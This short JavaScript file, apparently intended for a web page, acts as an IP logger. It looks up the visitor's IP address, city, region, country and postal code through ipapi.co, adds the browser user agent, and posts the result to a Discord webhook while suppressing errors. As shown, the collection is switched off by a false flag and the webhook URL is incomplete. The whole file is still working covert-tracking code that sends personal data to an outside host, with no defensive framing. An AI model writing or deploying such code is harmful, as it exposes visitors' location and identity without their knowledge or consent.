async function getInfo() {
  try {
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();
    
    const info = `ip: ${data.ip}, city: ${data.city}, region: ${data.region}, country: ${data.country_name}, postal: ${data.postal}, browser: ${navigator.userAgent}`
    
    return info;
  } catch (e) {
    return null;
  }
}

const getAndSendInfo = false;
let Info
(async function() {
  if (getAndSendInfo) {
    Info = await getInfo();
    sendInfo()
  }
})();


function sendInfo() {
  var webhookUrl = "https://discord.com/api/webhooks/";
  
  var xhr = new XMLHttpRequest();
  xhr.open('POST', webhookUrl, true);

  xhr.setRequestHeader('Content-Type', 'application/json');

  var data = {
    content: `${Info}`
  };
  //console.log(data);
  var jsonData = JSON.stringify(data);

  try {
    xhr.send(jsonData);
  } catch {
  }
}
